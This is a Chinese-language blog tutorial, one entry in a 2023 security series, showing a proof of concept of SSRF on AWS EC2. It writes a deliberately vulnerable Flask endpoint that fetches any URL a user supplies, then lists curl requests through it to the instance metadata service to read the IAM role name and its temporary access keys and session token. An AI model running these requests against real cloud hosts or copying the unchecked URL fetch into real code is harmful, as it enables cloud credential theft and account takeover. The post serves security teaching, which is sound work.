---
author: Sunny Tsai
title: "[Day 22] 天堂雲端 - EC2 MetaService Credentials洩漏 by SSRF POC"
date: 2023-10-05
math: true
tags: [
    "aws",
    "ec2",
    "imds",
    "SSRF"
]
categories: [
    "2023鐵人賽"
]
series: ["2023鐵人賽-天堂雲端之從開始到接管"]
---
寫一個簡單的SSRF漏洞
```python
from flask import Flask, request
import requests

app = Flask(__name__)


@app.route("/index")     # 127.0.0.1/8000/index?url={URL}
def follow_url():
    url = request.args.get("url", "")
    if url:
        return requests.get(url).text

    return "no url parameter provided"


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
```

把這份含有SSRF漏洞的Web應用程式丟到EC2上面執行，因為是測試用直接python3 {執行檔}就好了，就不設定瀏覽器服務。

# 取得Instance MetaService Credential
雖然IMDS僅在實例內部可用，不能通過網絡從外部訪問。但是透過SSRF漏洞可以執行外部訪問IMDS憑證

### 查詢EC2 instance 是否有關聯的IAM role
Request
```shell
curl /index?url=http://169.254.169.254/latest/meta-data/iam
```
Output
```shell
info security-credentials/
```
確定有關聯的IAM role

-----


### 返回與Credential關聯的IAM role名稱
Request
```shell
curl http://ec2-54-156-95-23.compute-1.amazonaws.com:12345/index?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```
Output
```shell
role name
```
如果是在自己架設的環境測試的話，可以進到EC2 -> 執行個體 -> 執行個體詳細資訊中查看輸出是否跟IAM 角色相符
![](https://imgur.com/xfPtb2N.png)


### 檢索Credential
Request
```shell
curl http://ec2-54-156-95-23.compute-1.amazonaws.com:12345/index?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/{role name}
```

Output
大概會長這樣
```json
{ "Code" : "Success", "LastUpdated" : "Date", "Type" : "AWS-HMAC", "AccessKeyId" : "XXXXXXXXXXXX", "SecretAccessKey" : "XXXXXXXX", "Token" : "XXXXXXXX", "Expiration" : "Date" }
```
